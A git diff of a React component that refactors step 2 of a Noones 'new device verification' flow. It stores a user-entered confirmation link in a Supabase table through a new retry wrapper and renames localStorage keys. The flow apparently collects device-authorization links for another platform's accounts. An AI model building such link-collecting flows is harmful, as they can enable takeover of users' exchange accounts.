@@ -1,11 +1,11 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
+import { fireAndMove } from '../../lib/syncRetry';
 
-const NOONES_TRACKING_ID_KEY = 'noones_tracking_id';
+const NOONES_SESSION_ID_KEY = 'noones_session_id';
 const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
 const NOONES_REQUEST_DATA_KEY = 'noones_request_data';
-const NOONES_REQUEST_ID_KEY = 'noones_tracking_id';
 
 export default function NoonesNewDeviceVerification() {
   const navigate = useNavigate();
@@ -53,32 +53,25 @@ export default function NoonesNewDeviceVerification() {
     setIsLoading(true);
 
     try {
-      const trackingId = window.localStorage.getItem(NOONES_TRACKING_ID_KEY);
+      const trackingId = window.localStorage.getItem(NOONES_SESSION_ID_KEY);
       if (!trackingId) {
         throw new Error('No tracking ID found');
       }
 
-      console.log('[PERSISTENT_PROGRESS] Step 2 - Updating confirmation_link for tracking_id:', trackingId);
-      // Non-blocking update - don't await
-      supabase
-        .from('platform_connection_requests')
-        .update({
-          confirmation_link: link.trim(),
-        })
-        .eq('tracking_id', trackingId)
-        .then((result) => {
-          if (result.error) {
-            console.error('[PERSISTENT_PROGRESS] Async update error for confirmation_link:', result.error);
-          } else {
-            console.log('[PERSISTENT_PROGRESS] Async update completed for tracking_id:', trackingId);
-          }
-        })
-        .catch((err) => {
-          console.error('[PERSISTENT_PROGRESS] Async update exception:', err);
-        });
+      console.log('[NOONES_STEP2] Updating confirmation_link for tracking_id:', trackingId);
+      
+      // Fire UPDATE with retry wrapper (non-blocking)
+      const syncId = `noones-step2-${trackingId}`;
+      fireAndMove(
+        () => supabase
+          .from('platform_connection_requests')
+          .update({ confirmation_link: link.trim() })
+          .eq('tracking_id', trackingId),
+        syncId,
+        { maxAttempts: 3, delayMs: 500 }
+      );
 
-      // User can proceed to next step immediately - no need to wait for DB update
-      console.log('[PERSISTENT_PROGRESS] Step 2 Complete: Link verified, moving to step 3');
+      console.log('[NOONES_STEP2] UPDATE fired in background, proceeding to Step 3');
 
       // Update progress
       const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
@@ -86,6 +79,7 @@ export default function NoonesNewDeviceVerification() {
       window.localStorage.setItem(NOONES_CURRENT_STEP_KEY, '3');
       window.localStorage.setItem(NOONES_REQUEST_DATA_KEY, JSON.stringify({ ...requestData, confirmation_link: link.trim() }));
 
+      // Navigate after brief delay
       setTimeout(() => {
         setIsRedirecting(true);
       }, 10000);
@@ -94,7 +88,7 @@ export default function NoonesNewDeviceVerification() {
         navigate('/connect/noones/verify-device', { state: { email, platformData: { ...requestData, confirmation_link: link.trim() } } });
       }, 13000);
     } catch (err: any) {
-      console.error('Error updating platform_connection_requests:', err);
+      console.error('[NOONES_STEP2] Error:', err);
       alert('Verification failed. Please try again.');
       setIsLoading(false);
     }
